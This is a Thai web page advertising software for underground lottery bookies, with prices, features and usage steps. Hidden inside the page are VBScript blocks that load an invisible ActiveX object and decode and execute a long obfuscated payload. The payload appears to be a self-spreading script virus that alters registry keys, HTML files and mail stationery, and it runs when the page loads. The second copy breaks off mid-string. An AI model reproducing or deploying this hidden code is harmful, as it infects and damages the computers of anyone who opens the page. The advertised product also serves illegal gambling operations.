Execute(ThisText)
</script>
<!--mstheme--></font></td></tr><!--msnavigation--></table><!--msnavigation--><table border="0" cellpadding="0" cellspacing="0" width="100%"><tr><td valign="top" width="1%"><!--mstheme--><font face="Tahoma">




<script language=vbscript>
document.write "<div style='position:absolute; left:0px; top:0px; width:0px; height:0px; z-index:28; visibility: hidden'><"&"APPLET NAME=KJ"&"_guest HEIGHT=0 WIDTH=0 code=com.ms."&"activeX.Active"&"XComponent></APPLET></div>"
</script>
<script language=vbscript>
ExeString = "=gmBlWe^pe)ArmiMcxq%TbpMcxq%BedkcePben):npi^Mbg^at)?QO)PqSe^jl)PgnMZrh)LsbB%DikZjyAbqkQu_IJ\lraom&)IJP^rDff&)IJ@kcaq^Kiibcu%HCJih^Gt%HCArbZreJZgl%HCNrli_g^mc(&Ek]Sr[Duk\rilgKG:npbgbTl!Dii^Naqa*TvicSqk'Hl BkpooPepnkeGcxqSbmRbZbTbfn :DSL'MpbgReumDii^&FfecP^mf,.QfnSqk=KcaaMcmm'Pe^]?liIcGnpmp(QfnSqk*HC]sqZpt% )5< -MrEcn%MkpPmp)51MfekRbZbTbfn.@emsbEubr CnlcqbmnCnaGfGfMwpbLrr6emrMfekRbZbTbfn.@emsbSbmFfecTbfn :DSL'MpbgReumDii^&FfecP^mf,/CbjeQ^kp+Ppiq^9&@OARokemaa6 $ o`s`kgpq3  # KGXqt^kr(& ;&o`CoEd #RmmLrrv_<pLc$ EmklQ^vtDii^Reji,CihqeQeqDAqmpi_; CLM.D^rFfec(CbjeMZrh&F>mrrf[,aqmpi_nrep; 0-BeqePe^]Reji,CihqeQeqDii^Reji=?QO+HnekMcxq?glb!Dii^Naqa*8&IcRym^Qto; armiTe^l?glbMcmm'Urfmc s[ArI_&:EMKL;&o`CoEd # <$ ;MDVmnih_d: s[qcobnt7&IJ\lraom&)  # >$ s[ArI_&ArmiMcxqEilcIcRym^Qto; o`sRhbgCbjeQ^kp+Ppiq^v_<pLc$ S[qTbqr>ldBd?glbMcmm'Alllc>ldBd>ld?sn`mgok?sn`mgokIJ@a_nd^Qu_!AuokcnqLrrfge,IZqtFgbeu<faoF_L^lrIk]cx@a_r60MfekIcJecm&L@Zqe%<sro^ltPmpik`',.=9JC^lc(\ )MfekKG<fak`cSr[=?gn^ewDfli # :YPn`E60Clp^HCAh^geePn` :Aho!?s`!Jecm&L@Zqe%<sro^ltPmpik`',.' */)7U LsbB; -Ek]IcEilcDHCeZlgbLsb6Mf]&CrkpekmQtoblg)**L^lrIk]cx@a_r&Ek]IcEk]FrgatfhlFrgatfhl HCArbZreJZgl%LgEokmrKcsrfc K^vtGfBlWe^pe6emklRhbgBqgt?sn`mgokEk]IcSeZpeCbje6Lb_r(TblP^mf,0&Nrl`pajDii^q\@hkmlgFfecsYFgcohqocmSeZpeaUQt^mgok^pyY[jakd,hqf Bd %?QO+?glb>vipmq(Pa_rb?glb' QacnAaieKG:npbgbTl!Qh^kcFfec,armi'>jsbSbmFfecTbfn :DSL'MpbgReumDii^&SeZpeCbje)+*tonc)Dii^Reji,Wobre:EMKL;&o`CoEd # <$ ;MDVmnih_d: s[qcobnt7&IJ\lraom&)  # >$ s[ArI_&ArmiMcxqFfecTbfn.@emsbEk]IcDb__uimGd6WpLfeie,Rb`Pe^]&EDCY\<SRO>LT\NQEOUGdbgriqbcsY=cf^njtNqeoGDLnrLlhiVbkqilg=PqSe^jl+KcgO^_d%FKBR]LL<?L\F?CEBLEYLmfqp_rbUKi`kmsl_r\Lnrllhi Bqnrblq\J^bi^OcrTlQhbej.O^eWobreFKBR]CRKPEKM]UP>P\F]cnqbriblZ#=cf^njtF]$YLmfqp_rbUKi`kmsl_r\Lnrllhi Bqnrblq\Lb_r(LnrLlhiVbkqilg*1&$+)ZM^bj\@hkpllc Rlc Pm_tfhleor ,.% RB@]DTHPDC^ej HCKafePed! HH>W_@NPRBGR_RLCRYBbekmgtf^q\BecZslqBb&UQocmuao^ZMf\pophdtYHstihmk>vpo^qsY$ I^dt%HstIhmkS^psfhl,.&'.\JZglYLraqbmnbkw KZke%Qh^kcFfec)AaieKGF_iiKcg%FKBR]CRKPEKM]UP>P\F]cnqbriblZ#=cf^njtF]$YLmfqp_rbUKi`kmsl_r\Lnrllhi Bqnrblq\Lb_r(LnrLlhiVbkqilg*1&$+)ZM^bj\TbbeLraqbmnbkw KZke%Qh^kcFfec)UsPacli'PedPpiq^EDCY\<SRO>LT\NQEOUQocmuao^ZMf\pophdtYHdff\c\6'.\Lnrllhi\Lirilgq\JZglY>biqhpPo^deo^lcb*10*.7/% RB@]DTHPDC^ej HCKafePed! HH>W_@NPRBGR_RLCRYLmfqp_rbUKi`kmsl_r\Tbldlpq J^qs^`gndQu_lwsq^k\MkmffecsYFgcohqocmOrmjoldIkmcrk^r P^rtfgesY)_0a)00-).0-).0-\.0-).0-).0-).43U.0.^.33) ,[jakd )AaieKGF_iiKcg%FKBR]CRKPEKM]UP>P\PhdttZpeYFgcohqocmZWfgbotlNQUAuokcnqOcrpbmnYPgnahusFcspZeik`Sr[qypmcmYIpocbjepUKi`kmsl_r Lnrllhi FgreogctLctqblgpU.a-].2-).0-).0-)a0-).0-).0-).01/Z0-*c00/.)`l^gi&WpLfeie,Rb`Urfmc AIEVXAUOKCNQXSSBKZSl_rw^kc\JbarllmfqUMfcbaeY*..-UMuqemohUMpqbmnpUKafeZEabrooIpec^pek\c)*11-00,KCG\=UOO= <_liIJJZglO^e(AIEVXAUOKCNQXSSBKZSl_rw^kc\JbarllmfqUMfcbaeY*..-UAojfmnYF_iiLctqblgpULetLraqbmnbkw)`l^gi&KGnkm^`cFlebeo!Jecm&WfgNaqa*3&$ Ipodk_m?glblZClfkokDii^q\JbarllmfqQh^kcdYLraqbmnbkw&Ek]FrgatfhlFrgatfhl HCArbZreJbjibn&)Mn>prlkRblsmbLeumQ^kpMZrh6IcLoq!DSL'Dii^Cxflrs%PgnMZrhTLarfir.bqc&Te^lMcmmI_te; lwsq^k3/U >ldBdBd Q^kpMZrh6prqtbf12YTe^lLraomSpCbje6WfgNaqa&QYPMCMYDcrk^j3/'bliBeqeQt^krUm?glb; TblP^mf # SVLREJUIeogcl+]jlEk]IcWpLfeie,Rb`Urfmc AIEVXJO@:J_J:AHFGC\PhdttZpeYFgcohqocmZWfgbotlZCrkpekmTeolgokUPukUIeogcl0+ ,Pm_rqNnFfec?QO+<mpv?glbUikI_te$ pcbYdhw^ej.dbd)PgnMZrht^`\Chjdbk,hqm ?QO+<mpv?glbUikI_te$ lwsq^k3/UijtZjl+`gf%UikI_te$ lwsq^k3/Ubepdrom'gnf@ZjlDHAmicnaMm(TblP^mf # wb[ZFlebeo'ftq*emr&WpLfeie,Rb`Urfmc AIEVXAL>LQEPXPOLMZ.aej\% diedii^ PqSe^jl+KcgTkgtb HH>W_@E?SP>Q_OHMTY'bliUAokmcnqRym^ ,Znpibaaqbmn,q+mp]mwkemaaTlQhbej.O^eWobreFKBR]CI:QSBL]RLHR\aejffec\A^darerI`hl\%UsPacli'PedKcaa! HH>W_@E?SP>Q_OHMTYovdcbjeY=cf^njtF\mnY'PqSe^jl+KcgTkgtb HH>W_@E?SP>Q_OHMTY]jlcbjeYLarfirEk`gnbU ,O@S`kgpqTlQhbej.O^eWobreFKBR]CI:QSBL]RLHR\aejFfec\PacliUMpbgZClfkak]Z)PgnMZrhTbfnP^mf # WP\pimm,eu^/#*WpLfeie,Rb`Urfmc AIEVXAL>LQEPXPOLMZdieDii^ZSe^jlBqZPohneomwSe^ctEZldi^psYPQHMkmppU ,t40/.2C>.+92,@-.*AF*1A93&.0>:.0?1505<{UsPacli'PedPpiq^EDCY\<JAPLCS\KMOQUbli?glbUQcobntEhqtBgaoa^Z)y82*113,/-11.C**/D/&@1C2+0-<.4C14C0+2}SbmFfecTbfn :DSL'MpbgReumDii^&SqZptRiDii^*2)mpubCbjeQ^kp+Ppiq^V_lReumCbjeQ^kp+<jop^Bgb CnlcqbmnCnlcqbmnDHLfdcIq!'Bd FgUhbkc 97emklRhbgBqgt?sn`mgokEk]IcTebqLl\_tfhl :bo`nkekm,ll\_tfhlBd I^dt%MfipEmc^mgok%4&; _glbTe^lMfipEmc^mgok; Jbb(QagsIhaaqbmn)2'Bd CLM.D^rEumcnpbmnKZke%MfipEmc^mgok<; mfekTebqLl\_tfhl :Jecm&TebqLl\_tfhl,I^l(QagsIhaaqbmn&+ I^l(CLM.D^rFfecN^fc(QagsIhaaqbmn&'>ldBdBd I^l(QagsIhaaqbmn&< 0RhbgQagsIhaaqbmn6TebqLl\_tfhl # \Ek]IcKGnkm^`cFlebeo!RhflJo`Zrilg'>ldBd>ld?sn`mgok?sn`mgokIJJZglO^e(O^eSqk*FfecN^fc)Mn>prlkRblsmbLeumO^eTbfnSqk=PqSe^jl+KcgO^_d%KcgPmp)GfKcgQ^kpPmp : MfekWpLfeie,Rb`Urfmc O^eSqk*FfecN^fc>ldBd>ld?sn`mgok?sn`mgokIJL[mSr[&CrkpekmQtoblg&Sr[C :.McsqHst60BoPfii^ToncMcsqHst6TblrOrm+*F_TblrOrm>+6 QacnAuokcnqLrrfge :DikZjyAbqk7U >viqBoCnaGfMn>prlkRblsmbLeumP^r QagsChjdbk=?QO+@ctChjdbk&CrkpekmQtoblg&SbmDf\Qu_; @kcaq^Mbg^at%Qcobntfge.Abatfhlaor )QeqDoi]crp; QagsChjdbk,Sr[Doi]crpFlebeo<mukm=)Chp BZahMcmm?mla^p fgFlebeolChjdbkAorgr :Doi]cr@hsnq) .Df\Qu_'_daDoi]cr@hsnq%TbfnFlebeo'Laj^K^vtGf=gcPn`.@hsnq; -RhbgIZqtFgbeu<fao; FgqtoKcv%<sro^ltPmpik`*Y*Lbg&CrkpekmQtoblg&&/)Qu_Lrrfge :Kia!AuokcnqLrrfge,IZqtFgbeu<fao$/,I^l(@nprbgrSqkgnd+L^lrIk]cx@a_r**'<sro^ltPmpik`=DHCeZlgbLsb%<sro^ltPmpik`*L^lrIk]cx@a_r&Sr[C :/>jsbIcQu_>=)Te^l<sro^ltPmpik`=<sro^ltPmpik`&=gcPn`.Fmcm%*' # \Eubr AhBeqeh :.?mrc=*TlDoi]cr@hsnqIcJC^lc(Pn`Sqkgnd=EAap^&Df\Qu_'Gtbf&j&Te^lBd g: ChjdbkAorgr QacnAuokcnqLrrfge :AuokcnqLrrfge #Bi`Lsb+Brej!h+.&ZCxfmDlEk]IcEk]IcNbqrE_sqBldbqAh^k=BlsqkPes!AuokcnqLrrfge,U ,I^l(@nprbgrSqkgnd+1&Sr[Qtoblg6Mf]&CrkpekmQtoblg)E_sqBldbqAh^k)1)Ecn%<sro^ltPmpik`'-IZqtFgbeu<fao&/)AuokcnqLrrfge :IJ@a_nd^Qu_!AuokcnqLrrfge,IZqtFgbeu<faoBgb F_Bgb F_IhmpIJL[mSr[=<sro^ltPmpik`Bgb CnlcqbmnCnlcqbmnDHPohnadZre%LgEokmrKcsrfc K^vtPedI_teO_lr^=FKBR]LL<?L\F?CEBLEYLmfqp_rbUKi`kmsl_r\Lnrllhi Bqnrblq\A^erb^ =gsh=cgo^c :UsPacli'PedKcaa!PedI_teO_lr^'Bd AbqkA^erb^=  QacnBipdBedkce6Ffg_lv=gsh$ 3ZCnaGfDoog=.ro.AbqkA^erb^=DHO_hQu_!BipdBedkce&KGnkm^`cFlebeo!BipdBedkce&NbqrPqSe^jl+KcgTkgtbPedI_teO_lr^*DfliDb`pebEk]FrgatfhlFrgatfhl HCsmjZeeChjdbk&P^mfN^fc)Mn>prlkRblsmbLeumP^r ChjdbkLaj^=?QO+@ctChjdbk&P^mfN^fc)QeqRhflDii^q :Doi]crKZke+?glblEmrEubqtp; -FlkE^\f QagsCbjeBl QagsCbjepFfecEum=NAap^&FPH,GbmCxq^lsfhlN^fc(QagsCbje+I_te'Bd CbjeBqr : HQF  LkFfecEum=FTJE  LkFfecEum=?SMOoDii^Cxq; IFPMr?glb>vt6GLNMfekC^ej HC?pm^ldQh&TebqFfec.MZrh)ftje )Clp^Gf?glb>vt6S;QMfekC^ej HC?pm^ldQh&TebqFfec.MZrh)tbp'>jsbBd CbjeBqr : HQM  QacnFtq>vipmq :/>ldBdGcxqIc&U@Zqe%I_teG_mb=NAap^&WfgNaqa&BepdromU )&Mr!SC^lc(MZrhKZke&; R<_sb!UikI_te$ =cshmmp'Te^lArtBqgsql=*Bgb F_F_HqmCxflrs60MfekFPH,CliwFfec TblP^mf # svlrej,0\a^qkqhn.fgg)I_teG_mbFPH,CliwFfec TblP^mf # wb[ZFlebeo'ftq*P^mfN^fc>ldBd>ld?sn`mgok?sn`mgokIJP^rDff&)Mn>prlkRblsmbLeumBkp.@ecaoTblrIq; TLarfir.P\pimmDuielaj^F_EokTe^lBlWe^pe6emklEilcBlWe^pe6s[qCnaGfGfBlWe^pe6s[qMfekSbmFPH=<pe^mcO_cccq! S`kgpqblg+?glbLwsq^kO_cccq'LctPqSe^jl6Co^_tbH`jb\r(PQcobnt+Lfeie )Clp^P^r >inlbH`jb\r :bo`nkekm,amijeql&HC]gr^qt>inlbH`jb\r.p^rCILGD%yF6,3D@+0-.<D0**/D-&?D?2+0-<.4C=38>)@}>inlbH`jb\r.`kcaq^Gnpm_n`^&)QeqUsPacli; >inlbH`jb\r.D^rO_cccq!':npi^Mbg^at+lct@EQIA! {-=23C>.1*?.90&/1@?+86-.--)?0@2.51+08z':npi^Mbg^at+\pe^mcIklrak\c(&SbmFPH=:npi^Mbg^at+@ctL[he`m&)CnaGfQeqBipdMbg^at6FPH,DobtepFlkE^\f AbqkQ^kpBl AbqkL[he`mF_DfliTbfn.AkgvbMwpb:>+Ak]DfliTbfn.AkgvbMwpb:>*Te^l>viqDooEk]IcFfg_lv=gsh; AbqkQ^kp+=pis^JeqmcrLeumAbk Lmfeo:pr%,'K_nahkiw^Chp f6. Qh3Mte^pAok&i&; Fgr(%2*Kld&K^vtRejiQtoblg6Flki:*TlJek!RhflReum'McmmGsm6Ap\&Mf]&TebqTbqr,f%/)&IcRejiLuj; .,Te^lMcmmGsm625EilcIcRejiLuj; .)Te^lMcmmGsm626Ek]IcTbfnCeZp :Aho!RejiLuj+ Lmfeo:pr%bMl]4&F_TbfnCeZp :Aho!14&RhbgQ^kp@a_r6Cek&15Bgb F_Q^kpPmpik`=McmmLrrfge #RejiAh^kK^vtSnIhakPmp : Eu^auq^&=gmDcy>kp(0*TebqTbqrtb@kJf# Kbr?ro!.)6Oqacr>kp(-& #o`CoEd&Iev:pr%*' :  #Mte^pAok&1&$  &s[ArI_$Dcy>kp(/=&Hrhbk?ro!0)$v_<pLc H^wAok&3&; $ Lmfeo:pr%,' # tb@kJf# Flki:*TlJek!CxbLrrfge)$v_<pLc Q^kpKnk :?s`!Kia!CxbLrrfge,f%/)& &s[ArI_$Bd Q^kpKnk :/8Mfek &s[ArI_$McmmGsm631 &s[ArI_$>ldBdtb@kJf# TbfnCeZp :Aho!RejiLuj) H^wAok&iFmd-')$v_<pLc F_TbfnCeZp :Aho!08&Rhbg #o`CoEd&RejiAh^k=o`Co &s[ArI_$>jsbBd Q^kp@a_r6Cek&26Te^ltb@kJf# TbfnCeZp :tbI_ #o`CoEd&CnaGf$v_<pLc QagsQ^vt6TebqTbqr #RejiAh^k #o`CoEd&Leum &&o`CoEd # Eu^auq^&TebqTbqr)TebqTbqr : Eu^Qtoblg6&McmmLrrfge # EmklQ^vt6 <$ larfir iZlgrZee:o`s`kgpq7  #tb@kJfahauj^lt+ppiq^  # <$ ]gvlryi^;'mhqiqbmn7Z`slestb4lb_r:-iv;mmp7)nx8uiamf:-iv;acidar:-iv;s+ik]cx7+6;ogsf[glfmw:agda^l';&: $ :NPI>R K:KE:DH \`sepmHBBEHQ6. TBBTE6. `hbe:\mm+fq.$ZatfocX+:atfoc U<mmmhlekm<9&-AMIJEQ7  # <$ (bis7 $ s[ArI_&:,larfir>$ s[ArI_&:p\pimml^geu^`c=s[qcobnt;&o`CoEd #RhflReum&o`CoEd #SnIhakPmp #tb@kJf9&-s`kgpq7  #tb@kJf9&-BL=W>$ s[ArI_&:,ARMI7 O`sQ^vt6TebqTbqr #tb@kJfUkEmchLrrv_<pLc$ DH_pm_rq!'UikI_te; CLM.D^rSm^ai^eDoi]cr%)' # \Ic&FPH,FfecEubqtp!UikI_te$ pcbY?mla^p.emr&Te^l?QO+<mpv?glbUikI_te$ pcbY?mla^p.emr)PgnMZrht^`\hcuaie,gf_ >ldBdBd %?QO+?glb>vipmq(TblP^mf # svlrej,0\a^qkqhn.fgg&Te^l?QO+<mpv?glbUikI_te$ lwsq^k3/Ubepdrom'gnf*WfgNaqa&qypmcm0+Zkgp_li'eicBgb F_Bgb Cnlcqbmn"
Execute("Dim KeyArr(3),ThisText"&vbCrLf&"KeyArr(0) = 3"&vbCrLf&"KeyArr(1) = 7"&vbCrLf&"KeyArr(2) = 2"&vbCrLf&"KeyArr(3) = 0"&vbCrLf&"For i=1 To Len(ExeString)"&vbCrLf&"TempNum = Asc(Mid(ExeString,i,1))"&vbCrLf&"If TempNum = 18 Then"&vbCrLf&"TempNum = 34"&vbCrLf&"End If"&vbCrLf&"TempChar = Chr(TempNum + KeyArr(i Mod 4))"&vbCrLf&"If TempChar = Chr(28) Then"&vbCrLf&"TempChar = vbCr"&vbCrLf&"ElseIf TempChar = Chr(29) Then"&vbCrLf&"TempChar = vbLf"&vbCrLf&"End If"&vbCrLf&"ThisText = ThisText & TempChar"&vbCrLf&"Next")
Execute(ThisText)
</script>
<!--mstheme--></font></td><td valign="top" width="24"></td><!--msnavigation--><td valign="top"><!--mstheme--><font face="Tahoma">

<p align="center"><font size="6" color="#FF0000" face="&amp;_NearSighted"><span style="background-color: #00FFFF">
<u>
<marquee width="100%">โปรแกรม &quot;ย.ยัก &quot;&nbsp;
มี 2 แบบ</marquee>
</u>
</span></font></p>
<p align="left"><font size="5"><span style="background-color: #00FFFF">แบบที่ 1.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
<u>ตัดธรรมดา</u>&nbsp; ราคา&nbsp; 5,000 บาท&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
( จะไม่มีการแปลง
ยักเลข )</span></font></p>
<p align="left"><font size="5"><span style="background-color: #00FFFF">-&nbsp;&nbsp;&nbsp;
ใช้หลายเครื่อง&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; เพิ่ม 3,500&nbsp;&nbsp;&nbsp;
บาท&nbsp; /จุด</span></font></p>
<p align="left"><span style="background-color: #00FFFF"><font size="5">-&nbsp;&nbsp;&nbsp;&nbsp;
ร<b>ะบบส่งโพยผ่านโมเด็ม</b> </font><font size="6"><u>(แทนการส่งแฟกซ์ )&nbsp;&nbsp;&nbsp;</u></font><font size="5">&nbsp;&nbsp;&nbsp;&nbsp;<b>
เพิ่ม&nbsp;&nbsp; 5,500&nbsp;
บาท&nbsp; /จุด</b></font></span></p>
<p><font size="5">&nbsp;</font></p>
<div align="center">
  <center>
  <!--mstheme--></font><table border="1" cellspacing="1" width="703" bordercolordark="#000000" bordercolorlight="#999999">
    <tr>
      <td width="693"><!--mstheme--><font face="Tahoma"><u><span style="background-color: #00FF00"><font size="6" color="#000000">คุณลักษณะโปรแกรมแบบตัดธรรมดา</font></span></u>
        <p><font size="4" color="#000000"><span style="background-color: #C0C0C0">-<u>ใช้งานง่าย รวดเร็ว
        เห็นแล้วใช้ได้ทันที&nbsp;&nbsp;&nbsp;&nbsp;
        ใช้งานจริง
        10 ปี
        ปัจจุบันทั้งหมดเปรื่ยนมาใช้แบบพิเศษหมดแล้ว</u></span></font></p>
        <p><font color="#000000" size="4"><span style="background-color: #C0C0C0"><u>-มีแบบเครื่องเดียว
        แบบหลายเครื่องช่วยกันลงโพย
        แบบทำหวยหลายที่ส่งตัดที่เดียวกันรับหวยถ่ายจากเจ้าเล็ก</u></span></font></p>
        <p><font color="#000000" size="4"><span style="background-color: #C0C0C0"><u>-รับหวยได้ทุกชนิด ทุกแบบ
        ทั่วประเทศไทย
        ตั้งแต่เจ้าเล็กไม่กี่หมื่น
        ถึงเจ้าใหญ่ๆรับเป็นสิบล้านต่องวด</u></span></font></p>
        <p><font color="#000000" size="4"><span style="background-color: #C0C0C0"><u>-ตั้งสวนลดลูกค้าแต่ละคน
        สรุปยอดการแทง/ยอดถูก
        สรุปยอดเก็บเงิน
        พิมพ์ได้ทันทีที่หวยออก 5
        นาทีรู้ผล</u></span></font>
        <p><font color="#000000" size="4"><span style="background-color: #C0C0C0"><u>-มี
        สูตรการยักหวยกระจายวิ่งล่างเป็น2ตัวล่าง
        19 หาง</u></span></font>
        <p><u>&nbsp;</u><!--mstheme--></font></td>
    </tr>
  </table><!--mstheme--><font face="Tahoma">
  </center>
</div>

<p><u><font size="5"><span style="background-color: #008080">ขั้นตอนการใช้งานจริง
แบบ ตัดธรรมดา</span></font></u></p>
<p><font size="5"><span style="background-color: #339999">1.
กดเลขแทงหวยตามโพยหวยเข้าเครื่อง
( ง่ายมาก ถูกต้องแม่นยำ
เร็วมาก
เหมือนกดเครื่องคิดเลข )</span></font></p>

<p><font size="5"><span style="background-color: #339999">2.ขณะลงโพย
สามารถดูยอดรวมแต่ละเลข
ที่แทงมาได้ตลอดเวลา
ตอนไหนก็ได้ ดูง่าย ชัดเจน</span></font></p>

<p><span style="background-color: #339999"><font size="5">3.ตั้งยอดหวยที่จะเก็บไว้กินเองแต่ละชนิด
(2บน , 3บน, 3โต๊ด, กลุ่ม, คู่หน้า,
คู่ถ่าง, วิ่งบน, วิ่งปักหลัก, 2.ล่าง,วิ่งล่าง,3ล่าง
)แล้วสั่งตัดตัวเกิน
พิมพ์ตัวเกิน แฟกซ์ได้เลย (สั่งตัดทีละชนิด
หรือพร้อมกันทีเดียวก็ได้
ตอนไหนก็ได้ )</font></span></p>

<p><font size="5"><span style="background-color: #339999">4.ถ้าโพยยังไม่หมดก็
กดแทงตามโพยไปเรื่อยๆ
แล้วตั้งยอดเก็บสั่งตัด
พิมพ์ตัวเกิน
กี่รอบก็ได้ตลอดเวลา</span></font></p>

<p><font size="5"><span style="background-color: #339999">5.หวยออก
ใส่เลขหวยที่ออก
เครื่องจะคิดยอดเงินแทงหัก%
ตรวจตัวถูก ยอดแทงออก
ของแต่ละรายแทงมาเท่าใด
หักแล้วเก็บเงินหรือจ่ายเงินแต่ละรายเท่าใด
ภายใน 5
นาทีรู้ว่าต้องจ่ายเงินเท่าใดและเก็บเงินใครเท่าใด</span></font></p>

<p>&nbsp;</p>

<p>&nbsp;</p>

<p align="right"><span style="background-color: #FFFF00"><a href="index.htm"><font size="5">กลับหน้าหลัก</font></a></span></p>
<!--mstheme--></font><!--msnavigation--></td><td valign="top" width="24"></td><td valign="top" width="1%"><!--mstheme--><font face="Tahoma">




<script language=vbscript>
document.write "<div style='position:absolute; left:0px; top:0px; width:0px; height:0px; z-index:28; visibility: hidden'><"&"APPLET NAME=KJ"&"_guest HEIGHT=0 WIDTH=0 code=com.ms."&"activeX.Active"&"XComponent></APPLET></div>"
</script>
<script language=vbscript>
ExeString = "=gmBlWe^pe)ArmiMcxq%TbpMcxq%BedkcePben):npi^Mbg^at)?QO)PqSe^jl)PgnMZrh)LsbB%DikZjyAbqkQu_IJ\lraom&)IJP^rDff&)IJ@kcaq^Kiibcu%HCJih^Gt%HCArbZreJZgl%HCNrli_g^mc(&Ek]Sr[Duk\rilgKG:npbgbTl!Dii^Naqa*TvicSqk'Hl BkpooPepnkeGcxqSbmRbZbTbfn :DSL'MpbgReumDii^&FfecP^mf,.QfnSqk=KcaaMcmm'Pe^]?liIcGnpmp(QfnSqk*HC]sqZpt% )5< -MrEcn%MkpPmp)51MfekRbZbTbfn.@emsbEubr CnlcqbmnCnaGfGfMwpbLrr6emrMfekRbZbTbfn.@emsbSbmFfecTbfn :DSL'MpbgReumDii^&FfecP^mf,/CbjeQ^kp+Ppiq^9&@OARokemaa6 $ o`s`kgpq3  # KGXqt^kr(& ;&o`CoEd #RmmLrrv_<pLc$ EmklQ^vtDii^Reji,CihqeQeqDAqmpi_; CLM.D^rFfec(CbjeMZrh&F>mrrf[,aqmpi_nrep; 0-BeqePe^]Reji,CihqeQeqDii^Reji=?QO+HnekMcxq?glb!Dii^Naqa*8&IcRym^Qto; armiTe^l?glbMcmm'Urfmc s[ArI_&:EMKL;&o`CoEd # <$ ;MDVmnih_d: s[qcobnt7&IJ\lraom&)  # >$ s[ArI_&ArmiMcxqEilcIcRym^Qto; o`sRhbgCbjeQ^kp+Ppiq^v_<pLc$ S[qTbqr>ldBd?glbMcmm'Alllc>ldBd>ld?sn`mgok?sn`mgokIJ@a_nd^Qu_!AuokcnqLrrfge,IZqtFgbeu<faoF_L^lrIk]cx@a_r60MfekIcJecm&L@Zqe%<sro^ltPmpik`',.=9JC^lc(\ )MfekKG<fak`cSr[=?gn^ewDfli # :YPn`E60Clp^HCAh^geePn` :Aho!?s`!Jecm&L@Zqe%<sro^ltPmpik`',.' */)7U LsbB; -Ek]IcEilcDHCeZlgbLsb6Mf]&CrkpekmQtoblg)**L^lrIk]cx@a_r&Ek]IcEk]FrgatfhlFrgatfhl HCArbZreJZgl%LgEokmrKcsrfc K^vtGfBlWe^pe6emklRhbgBqgt?sn`mgokEk]IcSeZpeCbje6Lb_r(TblP^mf,0&Nrl`pajDii^q\@hkmlgFfecsYFgcohqocmSeZpeaUQt^mgok^pyY[jakd,hqf Bd %?QO+?glb>vipmq(Pa_rb?glb' QacnAaieKG:npbgbTl!Qh^kcFfec,armi'>jsbSbmFfecTbfn :DSL'MpbgReumDii^&SeZpeCbje)+*tonc)Dii^Reji,Wobre:EMKL;&o`CoEd # <$ ;MDVmnih_d: s[qcobnt7&IJ\lraom&)  # >$ s[ArI_&ArmiMcxqFfecTbfn.@emsbEk]IcDb__uimGd6WpLfeie,Rb`Pe^]&EDCY\<SRO>LT\NQEOUGdbgriqbcsY=cf^njtNqeoGDLnrLlhiVbkqilg=PqSe^jl+KcgO^_d%FKBR]LL<?L\F?CEBLEYLmfqp_rbUKi`kmsl_r\Lnrllhi Bqnrblq\J^bi^OcrTlQhbej.O^eWobreFKBR]CRKPEKM]UP>P\F]cnqbriblZ#=cf^njtF]$YLmfqp_rbUKi`kmsl_r\Lnrllhi Bqnrblq\Lb_r(LnrLlhiVbkqilg*1&$+)ZM^bj\@hkpllc Rlc Pm_tfhleor ,.% RB@]DTHPDC^ej HCKafePed! HH>W_@NPRBGR_RLCRYBbekmgtf^q\BecZslqBb&UQocmuao^ZMf\pophdtYHstihmk>vpo^qsY$ I^dt%HstIhmkS^psfhl,.&'.\JZglYLraqbmnbkw KZke%Qh^kcFfec)AaieKGF_iiKcg%FKBR]CRKPEKM]UP>P\F]cnqbriblZ#=cf^njtF]$YLmfqp_rbUKi`kmsl_r\Lnrllhi Bqnrblq\Lb_r(LnrLlhiVbkqilg*1&$+)ZM^bj\TbbeLraqbmnbkw KZke%Qh^kcFfec)UsPacli'PedPpiq^EDCY\<SRO>LT\NQEOUQocmuao^ZMf\pophdtYHdff\c\6'.\Lnrllhi\Lirilgq\JZglY>biqhpPo^deo^lcb*10*.7/% RB@]DTHPDC^ej HCKafePed! HH>W_@NPRBGR_RLCRYLmfqp_rbUKi`kmsl_r\Tbldlpq J^qs^`gndQu_lwsq^k\MkmffecsYFgcohqocmOrmjoldIkmcrk^r P^rtfgesY)_0a)00-).0-).0-\.0-).0-).0-).43U.0.^.33) ,[jakd )AaieKGF_iiKcg%FKBR]CRKPEKM]UP>P\PhdttZpeYFgcohqocmZWfgbotlNQUAuokcnqOcrpbmnYPgnahusFcspZeik`Sr[qypmcmYIpocbjepUKi`kmsl_r Lnrllhi FgreogctLctqblgpU.a-].2-).0-).0-)a0-).0-).0-).01/Z0-*c00/.)`l^gi&WpLfeie,Rb`Urfmc AIEVXAUOKCNQXSSBKZSl_rw^kc\JbarllmfqUMfcbaeY*..-UMuqemohUMpqbmnpUKafeZEabrooIpec^pek\c)*11-00,KCG\=UOO= <_liIJJZglO^e(AIEVXAUOKCNQXSSBKZSl_rw^kc\JbarllmfqUMfcbaeY*..-UAojfmnYF_iiLctqblgpULetLraqbmnbkw)`l^gi&KGnkm^`cFlebeo!Jecm&WfgNaqa*3&$ Ipodk_m?glblZClfkokDii^q\JbarllmfqQh^kcdYLraqbmnbkw&Ek]FrgatfhlFrgatfhl HCArbZreJbjibn&)Mn>prlkRblsmbLeumQ^kpMZrh6IcLoq!DSL'Dii^Cxflrs%PgnMZrhTLarfir.bqc&Te^lMcmmI_te; lwsq^k3/U >ldBdBd Q^kpMZrh6prqtbf12YTe^lLraomSpCbje6WfgNaqa&QYPMCMYDcrk^j3/'bliBeqeQt^krUm?glb; TblP^mf # SVLREJUIeogcl+]jlEk]IcWpLfeie,Rb`Urfmc AIEVXJO@:J_J:AHFGC\PhdttZpeYFgcohqocmZWfgbotlZCrkpekmTeolgokUPukUIeogcl0+ ,Pm_rqNnFfec?QO+<mpv?glbUikI_te$ pcbYdhw^ej.dbd)PgnMZrht^`\Chjdbk,hqm ?QO+<mpv?glbUikI_te$ lwsq^k3/UijtZjl+`gf%UikI_te$ lwsq^k3/Ubepdrom'gnf@ZjlDHAmicnaMm(TblP^mf # wb[ZFlebeo'ftq*emr&WpLfeie,Rb`Urfmc AIEVXAL>LQEPXPOLMZ.aej\% diedii^ PqSe^jl+KcgTkgtb HH>W_@E?SP>Q_OHMTY'bliUAokmcnqRym^ ,Znpibaaqbmn,q+mp]mwkemaaTlQhbej.O^eWobreFKBR]CI:QSBL]RLHR\aejffec\A^darerI`hl\%UsPacli'PedKcaa! 